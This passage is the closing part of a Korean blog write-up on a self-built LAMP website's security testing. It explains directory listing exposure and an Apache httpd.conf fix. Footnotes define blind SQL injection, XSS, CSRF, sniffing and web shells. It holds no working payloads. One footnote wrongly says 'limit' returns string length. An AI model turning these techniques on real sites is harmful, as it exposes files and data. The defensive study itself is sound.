<br>원래의 목적은 문서의 공유로 파일 탐색기처럼 `원하는 문서`로 바로 찾아갈 수 있게 하는 용도였지만 최근에는 문서의 저장 및 열람이 가능하다면 문서의 `취약점(백업파일 및 소스코드, 스크립트 파일의 유출로 인한 계정 정보 유출 등등)`을 이용해 `악의적인 목적`을 갖고 있는 사람들에게 `탈취 및 웹서버 공격`이 이루어진다.
<BR>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FSVInk%2Fbtrd14IFX1V%2FR9TKQadHo0uUJoh5NwAk8k%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 36. 디렉토리 리스팅</figcaption>
</figure>
html 페이지의 소스보기를 할 수 있을때, 이미지 및 파일의 경로가 적혀있는 부분이 있다. 여기서 URL 부분에 파일명을 지우고 입력하면 다음과 같이 파일리스트를 볼 수 있습니다.

#### 대응 방안
현재 공격이 가능한 부분은 메인부분을 제외한 URL 부분에 파일명을 지우고 접속시 디렉터리로 들어가지는 부분에서 취약점이 발생됩니다.
<br>이러한 취약점이 발생되면 모든 `파일명이 노출`이 되므로 위험한 취약점 입니다.
<br>해당 취약점을 보안하기 위해서는 아파치 웹 서버에 `/etc/httpd/conf/httpd.conf` 파일에 내용중 `Options Indexes FollowSymLinks -> Options FollowSymLinks` 로 내용을 수정하여 저장하면 됩니다.
<br>그러면 접속시 403 혹은 404에러 메시지가 나오는데 403은 `파일 목록`, 404는 `존재하지 않는 페이지`로 나오는데 이것도 취약점이 될 수 있어 httpd.conf에서 추가적으로 `ErrorDocument 403 /index.php, ErrorDocument 404 /index.php` 메인페이지로 이동하게 하여 보안을 하면 됩니다.

<hr>

# 5. 프로젝트 결과
오랜만에 다시 lamp로 웹 구축을 하니 코딩공부에 도움도 되었고 CSS를 직접골라 입혀보니 `재미`있었다. 그리고 구축한 홈페이지를 직접 취약점도 점검해보니 역시 `보안도 중요`하다는것을 많이 `느꼈고 사소하고 쉬운` 웹해킹 방법이었지만 `OWASP TOP 10에` 매년 나오는 만큼 해당 `취약점`들이 `위험`하다는것도 `실감`하였다.
<br>다음에는 위와 같은 `취약점 점검` 및 `보안`을 할때 기초 부분은 도움이 많이 될 것 같다.


<hr>

##### Notes
<small id="user-ref"><sup>[[1]](#sql)</sup> Blind SQL 인젝션의 쿼리문에 사용하는 함수는 substring,ascii,limit 등이 있다.<br>
substring함수는 첫 번째 인자로 받은 문자열을 지정한 길이만큼 출력하는데, 주로 문자 하나씩 출력 하여 이름을 알아내는데에 사용한다.
<br>ascii함수는 문자를 아스키코드로 변환하는데, 작은따옴표(')를 우회하는 변수일 때 문자를 입력하기 위하여 사용한다.
limit 함수는 문자열의 길이를 반환한다. 문장열의 길이를 알아내면 substring 함수로 문자열을 추측하기 쉬워진다.  세 함수를 통해 임의의 값을 입력하며 데이터베이스 내용을 알아낼 때까지 계속 비교한다.</small>
<br>
<br>
<small id="user-ref2"><sup>[[2]](#based)</sup> 참과 거짓만 출력하는 페이지에 공격자가 조작한 쿼리로 인해 데이터베이스 내용을 노출하는 취약점이다.  쿼리는 데이터베이스 내용이 일치하여 웹 페이지에서 참을 출력시킬 때까지 임의의 값을 대입한다.</small>
<br>
<br>
<small id="user-ref3"><sup>[[3]](#xss)</sup> 웹 브라우저에서 사용자가 입력 할수 있는 input태그 등에 악의적인 script를 작성하여 해당 contents를 이용하는 다른 이용자의 개인정보 및 쿠키정보 탈취, 악성코드 감염, 웹 페이지 변조등의 공격을 한다.</small>
<br>
<br>
<small id="user-ref4"><sup>[[4]](#csrf)</sup> 정의만 보면 앞서 알아봤던 XSS와 SQL injection과 비슷하다.
<br>XSS가 사용자가 특정 사이트를 신뢰한다는 점을 공격하는거라면, CSRF는 특정 사이트가 사용자의 브라우저를 신뢰한다는 점을 공격하는 것이 다르다.
<br>간단하게 정리하자면, 악성코드가 XSS: 클라이언트에서 발생 / CSRF: 서버에서 발생이라고 할 수 있다.</small>
<br>
<br>
<small id="user-ref5"><sup>[[5]](#fiddler)</sup> Fiddler 는 컴퓨터와 웹 서버 또는 서버 간의 HTTP 및 HTTPS 트래픽 을 기록, 검사 및 변경하는 데 사용되는 디버깅 프록시 서버 도구 입니다.</small>
<br>
<br>
<small id="user-ref6"><sup>[[6]](#sniffing)</sup> Sniffing의 사전적 의미는 코를 킁킁거리다, 냄새를 맡다 등의 뜻이 존재한다.<br>
자신이 아닌상대방들의 패킷이 통신망에 돌아다니는 데이터를 몰래 도청하는 행위이다.  정보자산의 기밀성을 저해한다.</small>
<br>
<br>
<small id="user-ref7"><sup>[[7]](#webshell)</sup>※쉘(shell) : 사용자에게 받은 지시를 해석하여 하드웨어 지시어로 바꿈으로써 운영체제의 커널과 사용자 사이를 이어주는 것</small>
<br>
<br>
<hr>

# 6. 참고자료
https://lucete1230-cyberpolice.tistory.com/94
<br>https://velog.io/@codren/%EC%9B%B9-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%8B%A4%EC%8A%B5-2-CSRF
<br>https://websecurity.tistory.com/125
<br>https://m.blog.naver.com/PostView.nhn?isHttpsRedirect=true&blogId=bgpoilkj&logNo=220751401209&proxyReferer=
<br>https://github.com/Veloideu/CIA_WEBSITE (웹 소스코드는 제 깃헙에 올려두었습니다.)